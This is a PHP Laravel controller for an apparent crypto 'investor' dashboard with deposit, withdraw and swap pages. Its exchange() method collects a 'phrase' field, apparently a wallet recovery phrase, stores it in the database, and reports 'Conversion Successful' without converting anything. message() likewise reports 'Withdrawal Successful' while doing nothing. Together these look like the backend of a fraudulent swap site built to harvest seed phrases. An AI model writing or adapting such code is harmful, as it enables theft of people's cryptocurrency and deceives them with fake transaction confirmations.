<?php

namespace App\Http\Controllers;

use App\Models\Coin;
use App\Models\Payment;
use App\Models\User;
use Illuminate\Http\Request;

class InvestorController extends Controller
{
    //


    public function show()
    {
        $user = auth()->user();
        return view('Investor.board', ['user' => $user]);
        // return view('Investor.dashboard');
    }





    public function reveal()
    {
        $user = auth()->user();
        return view('Investor.deposit', ['user' => $user]);
        // return view('Investor.deposit');
    }

    public function coin()
    {
        $payment = Payment::all();
        return view('Investor.address', compact('payment'));
    }



    public function profile()
    {

        return view('Investor.profile');
    }


    public function profileupdate()
    {

        return view('Investor.profile');
    }

    public function withdraw()
    {
        $user = auth()->user();
        return view('Investor.withdraw', ['user' => $user]);
        // return view('Investor.withdraw');
    }


    public function withdrawform()
    {

        return view('Investor.withdrawform');
    }

    public function swap()
    {

        return view('Investor.cornswap');
    }

    public function form()
    {

        return view('Investor.form');
    }


    public function message()
    {

        return redirect()->route('investor.formm')->with('success', 'Withdrawal Successful');
    }

    public function storecoin(Request $request)
    {
        // $coin = new Coin();
        // $coin->wallet = $request->input('wallet');

        $request->validate([
            'wallet' => ['required', 'string', 'max:100'],

        ]);

        $coin = Coin::create([
            'wallet' => $request->wallet,

        ]);
        $coin->save();

        // return redirect()->route('coin.index');

        return view('Investor.cornswap');
    }

    public function exchange(Request $request)
    {
        // $coin = new Coin();
        // $coin->wallet = $request->input('wallet');

        $request->validate([
            'phrase' => ['required', 'string', 'max:100'],
            'to' => ['required', 'string', 'max:100'],
            'toamount' => ['required', 'string', 'max:100'],
            'from' => ['required', 'string', 'max:100'],
            'fromamount' => ['required', 'string', 'max:100'],

        ]);

        $coin = Coin::create([
            'phrase' => $request->phrase,
            'to' => $request->to,
            'toamount' => $request->toamount,
            'from' => $request->from,
            'fromamount' => $request->fromamount,

        ]);
        $coin->save();

        // return redirect()->route('coin.index');

        // return view('Investor.cornswap');
        return redirect()->route('investor.swap')->with('success', 'Conversion Successful');

    }


}
